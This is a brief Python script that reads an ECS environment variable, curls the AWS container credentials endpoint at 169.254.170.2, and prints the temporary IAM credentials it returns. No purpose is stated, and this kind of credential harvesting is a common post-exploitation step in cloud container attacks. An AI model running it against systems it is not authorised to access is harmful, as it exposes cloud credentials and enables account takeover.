import socket
import subprocess
import os

relative_URI = os.environ['AWS_CONTAINER_CREDENTIALS_RELATIVE_URI']

url = "169.254.170.2" + relative_URI

print(relative_URI)
print(url)
output = subprocess.check_output(['curl', url])

print(output)